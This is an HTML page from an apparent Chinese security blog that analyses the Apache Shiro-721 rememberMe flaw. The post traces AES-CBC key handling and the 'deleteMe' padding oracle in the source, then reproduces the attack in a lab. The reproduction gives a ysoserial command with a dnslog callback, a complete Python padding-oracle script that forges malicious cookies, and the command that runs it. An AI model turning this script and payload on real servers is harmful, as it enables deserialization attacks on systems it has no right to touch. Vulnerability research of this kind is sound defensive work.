@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="无聊ini">
+    <meta name="author" content="follycat">
+    <meta name="referrer" content="no-referrer" />
+    
+    <title>
+        
+            shiro-721 |
+        
+        follycatのblog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/wul.jpg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"follycatのblog","author":"follycat","avatar":"/images/wul.jpg","logo":"/images/wul.jpg","favicon":"/images/wul.jpg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"If you're reading this, welcome to my blog!","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/wul.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               follycatのblog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        shiro-721
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/wul.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">follycat</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-05-22 03:34:52</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Thu May 22 2025 23:07:58 GMT+0800">2025-05-22 23:07:58</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.4k Words</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>6 Mins</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>有点小懒哈哈，就直接用的<a class="link" target="_blank" rel="noopener" href="https://drun1baby.top/">Drunkbaby<i class="fas fa-external-link-alt"></i></a>师傅的环境了，直接用<a class="link" target="_blank" rel="noopener" href="https://minhaskamal.github.io/DownGit/#/home?url=https:%2F%2Fgithub.com%2FDrun1baby%2FJavaSecurityLearning%2Ftree%2Fd47e6051e375b034e2b0a41491209f0af1b58f69%2FJavaSecurity%2FApache%2FShiro%2Fshiro721">downgit<i class="fas fa-external-link-alt"></i></a>下载了，然后和shiro550一样配一个tomcat就可以了，搭建好之后就是这样子的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747216270410-74967dbd-c928-4ea7-800b-bf7958075fe3.png"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>这个漏洞主要基于Padding Oracle Attack攻击，由于shiro对cookie的加密模式为AES-CBC，并且可以从返回中得到从而导致了这个漏洞的存在</p>
+<h2 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h2><p>原理可以参考这几个佬写的，写的很详细。</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://goodapple.top/archives/217">https://goodapple.top/archives/217<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://lightless.me/archives/padding-oracle-attacks.html#_label2_0">https://lightless.me/archives/padding-oracle-attacks.html#_label2_0<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#Padding-Oracle-Attack-%E6%9E%84%E9%80%A0%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90">https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#Padding-Oracle-Attack-%E6%9E%84%E9%80%A0%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p>
+<p>我个人的理解是，通过是否能使明文符合填充规律的判断来依次爆破iv最后一个字节到第一个字节的值，以此得到所有正确的明文以及中间值，然后将iv进行修改，从而异或出想要的明文。</p>
+<p>Padding Oracle Attack的利用条件有几个:</p>
+<ol>
+<li>是使用AES-CBC进行加密的</li>
+<li>可以获取到密文以及iv</li>
+<li>可以观察到解密的结果是否正确</li>
+</ol>
+<h2 id="加密代码分析"><a href="#加密代码分析" class="headerlink" title="加密代码分析"></a>加密代码分析</h2><p>首先是他的加密代码，在之前的shiro550漏洞的分析过程中，通过对其解密方式的分析寻找到了其AES加密的默认密钥，而后续shiro将默认密钥取消，更改为如果用户不自己设置密钥，就随机生成，在那段代码中就存在AES加密的实现代码。</p>
+<p>首先，找到<code>org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager</code>这个方法就是之前shiro550中找到密钥的方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747830545900-6e7e9667-e680-4b19-902d-96f85ac5449e.png"></p>
+<p>然后看到其加密是调用了AesCipherService这个类的，跟进这个类</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747830636951-fa79c32c-7b33-4844-8de8-67e2e8509ec2.png"></p>
+<p>这个类很简单，但是他是继承了DefaultBlockCipherService这个类的，所以继续跟进到DefaultBlockCipherService这个类中</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747830930127-3338fd6d-2394-4c17-abc0-e6cf2e8b34da.png"></p>
+<p>找到他的构造函数， 其中继承了父类并初始化了加密算法，其中设置了加密模式为CBC， 并将流式加密的填充方案设置为 PKCS5，这就构成了Padding Oracle Attack的部分条件，也就是加密为AEC-CBC模式。</p>
+<h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h3><p>这里调试一下，来跟一下它密钥生成的过程。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747840023352-55fd9411-cc58-44c3-b02c-aeb8accb7f97.png"></p>
+<p>首先可以看到其初始化的一些参数， shiro是通过<code>generateNewKey()</code>方法来获取密钥的，所以调试到generateNewKey中</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747840349247-4bf42b3f-3300-4e5b-a24b-56328efa31f3.png"></p>
+<p>继续步入到generateNewKey，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747840444104-de3dad5c-5a67-4236-8299-59cf410b475b.png"></p>
+<p>然后初始化了一个KeyGenerator，其中getAlgorithmName的参数就是AES，随后调用<code>init()</code>方法，继续步入<code>init()</code>。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747840882347-d3e34f6c-a1e3-4be0-99a1-7fe5a38476d6.png"></p>
+<p>其中JceSecurity.RANDOM是一个预定义的 <code>SecureRandom</code> 对象，通常用于提供安全的随机数，随后步入到下面的init()方法中，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747841054333-a7fbe7c2-e761-40be-a884-65459464a17f.png"></p>
+<p>其进行了一个初始化的操作，其中engineInit方法用于初始化 AES 加密引擎，继续调试，在engineGenerateKey方法中下一个断点。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747851064856-244f11a5-bcf3-4b1c-9488-f3f3957bb6cf.png"></p>
+<p>这个方法是用于AES的密钥生成的，其中通过定义好的密钥大小进行随机生成密钥。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747851741349-2684a03b-36bb-4622-bc95-c7b37e58c71a.png"></p>
+<p>可以看到密钥已经成功生成了，随后跟进到getEncoded中。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747851911138-ad719712-d8f0-40f4-9c05-652910f96d18.png"></p>
+<p>将密钥读取出来，从而完成密钥生成操作</p>
+<h2 id="Shiro中的cookie处理操作分析"><a href="#Shiro中的cookie处理操作分析" class="headerlink" title="Shiro中的cookie处理操作分析"></a>Shiro中的cookie处理操作分析</h2><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><p>首先找到解密函数<code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt()</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747852363009-0c91eafe-0fac-4470-bd99-b5f7a811800b.png"></p>
+<p>继续跟进到cipherService.decrypt中，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747852445777-a0b2c23c-7a0c-4eeb-ab03-8cef3c9d1b80.png"></p>
+<p>这个方法用于解密操作，并提取初始化iv，继续跟进到下一个decrypt中。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747852877664-f8b93625-2a78-4879-851a-f69ffb6853ea.png"></p>
+<p>步入crypt，其进入了doFinal方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747853116318-0e8b8ac4-a815-4e8c-a38f-e1977c45dcc7.png"></p>
+<p>跟进到doFinal，可以发现其有两个异常处理，分别用于捕获块大小异常和填充错误异常。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747853453423-f1b1e4f7-2fd9-4bbf-a0b2-066a9986f611.png"></p>
+<p>如果出现异常的话将会被抛出到<code>crypt()</code> 方法中，并且进入<code>onRememberedPrincipalFailure</code>方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747853789310-447c74c3-9416-4977-b9d5-177ab1f41250.png"></p>
+<p>跟进到<code>onRememberedPrincipalFailure</code>方法，这个方法又调用了forgetIdentity方法，这个方法就是输出<code>Set-Cookie: rememberMe=deleteMe</code>的方法，因此如果Padding不正确将会输出<code>Set-Cookie: rememberMe=deleteMe</code>。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747853906256-073867c2-798a-4fc5-9b14-fce3ec485b3d.png"></p>
+<h3 id="正确处理"><a href="#正确处理" class="headerlink" title="正确处理"></a>正确处理</h3><p>当没有报出异常时，程序将继续运行，从而获取于返回解密后的序列化数据。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747854522212-0cb77089-8567-438e-9f82-d2d0313ef224.png"></p>
+<p>返回序列化数据后，就和shiro550的反序列化处理是一样的了。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747854648790-d7cd75c0-16ef-41ee-9bc8-08af9193f210.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747854688791-725a4fac-b2e9-457f-a3d2-dffd26f6b6a1.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747854711432-e3b7a387-c00a-44c7-b108-4dfe46256299.png"></p>
+<p>由于有俩个不同的返回值，正确时正常返回，错误时返回<code>Set-Cookie: rememberMe=deleteMe</code>，因此构成了Padding Oracle Attack的条件。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先就是使用yso生成一个<code>payload.class</code>文件，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar URLDNS &quot;http://zjc7fd.dnslog.cn&quot; &gt; payload.class</span><br></pre></td></tr></table></figure>
+
+<p>然后用这个脚本跑<a class="link" target="_blank" rel="noopener" href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/3ndz/Shiro-721  </span><br><span class="line"># -*- coding: utf-8 -*-  </span><br><span class="line">from paddingoracle import BadPaddingException, PaddingOracle  </span><br><span class="line">from base64 import b64encode, b64decode  </span><br><span class="line">from urllib import quote, unquote  </span><br><span class="line">import requests  </span><br><span class="line">import socket  </span><br><span class="line">import time  </span><br><span class="line">  </span><br><span class="line">class PadBuster(PaddingOracle):  </span><br><span class="line">    def __init__(self, **kwargs):  </span><br><span class="line">        super(PadBuster, self).__init__(**kwargs)  </span><br><span class="line">        self.session = requests.Session()  </span><br><span class="line">        self.wait = kwargs.get(&#x27;wait&#x27;, 2.0)  </span><br><span class="line">  </span><br><span class="line">    def oracle(self, data, **kwargs):  </span><br><span class="line">        somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)  </span><br><span class="line">        self.session.cookies[&#x27;rememberMe&#x27;] = somecookie  </span><br><span class="line">        if self.session.cookies.get(&#x27;JSESSIONID&#x27;):  </span><br><span class="line">            del self.session.cookies[&#x27;JSESSIONID&#x27;]  </span><br><span class="line">        while 1:  </span><br><span class="line">            try:  </span><br><span class="line">                response = self.session.get(sys.argv[1],  </span><br><span class="line">                        stream=False, timeout=5, verify=False)  </span><br><span class="line">                break  </span><br><span class="line">            except (socket.error, requests.exceptions.RequestException):  </span><br><span class="line">                logging.exception(&#x27;Retrying request in %.2f seconds...&#x27;,  </span><br><span class="line">                                  self.wait)  </span><br><span class="line">                time.sleep(self.wait)  </span><br><span class="line">                continue  </span><br><span class="line">  </span><br><span class="line">        self.history.append(response)  </span><br><span class="line">        if response.headers.get(&#x27;Set-Cookie&#x27;) is None or &#x27;deleteMe&#x27; not in response.headers.get(&#x27;Set-Cookie&#x27;):  </span><br><span class="line">            logging.debug(&#x27;No padding exception raised on %r&#x27;, somecookie)  </span><br><span class="line">            return  </span><br><span class="line">        raise BadPaddingException  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:  </span><br><span class="line">    import logging  </span><br><span class="line">    import sys  </span><br><span class="line">  </span><br><span class="line">    if not sys.argv[3:]:  </span><br><span class="line">        print &#x27;Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;&#x27; % (sys.argv[0], )  </span><br><span class="line">        sys.exit(1)  </span><br><span class="line">  </span><br><span class="line">    logging.basicConfig(level=logging.DEBUG)  </span><br><span class="line">    encrypted_cookie = b64decode(unquote(sys.argv[2]))  </span><br><span class="line">    padbuster = PadBuster()  </span><br><span class="line">    payload = open(sys.argv[3], &#x27;rb&#x27;).read()  </span><br><span class="line">    enc = padbuster.encrypt(plaintext=payload, block_size=16)  </span><br><span class="line">    print(&#x27;rememberMe cookies:&#x27;)  </span><br><span class="line">    print(b64encode(enc))</span><br></pre></td></tr></table></figure>
+
+<p>将paddingoracle.py下载下来然后放在一个目录里就可以了</p>
+<p>目录如下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747856035287-b1f23650-199e-4e36-8c32-e722cb41d598.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 1.py http://192.168.45.1:8080/shiro721_war/account ODTZF2XfGvZt6Sd7nPr1uobDF3wEPLFATG4FI/AnHlfqK84poH1O29Isv1b28yKUPb4Q0+mQJJIOdLjxUGQ/yH6tfO+/vv0ELaDPr10htVAClDEdYbtWN8LETc8tCiAwYshj0ScvakVXDbmjcIVkUA2HEP0KPJJbO5Fy6MgG27XXhikyVnehaqITonX9C1EVFGuvzCZPZygYlHP3Lw+VAXMQ7+fD0P5OrmIwk60DqE7cFWSxkXMi/Q7odK0blH/6rvOrLcirrga0bIi0+6RN/F0Sl9zQSnZCZlZylT1c8HvxYCLblmnZjh8FG7RZpYO4mTkuGp2b6KqkLUEC4cXO+dMGYcscAUWOc+RUeBsSLlB/j/UodYfa98Gzf2luMldcDX1K5YN+Z2j0Qj9TQbU6OTmxbr6+FD9Sf7bJuU8lRQyNSj2sygd/9Q3U5nDUQTq4/B3rb6afnfRYHeG8A4qaNgiYHJxIZ+BcTgclz6IMp4bkGYWdTFcTBMwplckHWpop payload.class</span><br></pre></td></tr></table></figure>
+
+<p>执行成功</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747856386234-d910f33d-31a2-4bba-ba76-2d423348445b.png"></p>
+<p>工具复现，这个是真快我丢</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1747856386234-d910f33d-31a2-4bba-ba76-2d423348445a.png"></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                shiro-721
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/05/22/shiro-721/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    Author
+                </div>
+                <div class="content">follycat</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    Published
+                </div>
+                <div class="content">2025-05-22 03:34</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    License
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="Copy copyright info" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/05/14/shiro-550/"
+                                   title="shiro-550"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">shiro-550</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="configuration-items-error-tip border-box">
+    <i class="fa-solid fa-circle-exclamation"></i>
+    Please fill in the required configuration items for Valine comment plugin
+</div>
+
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
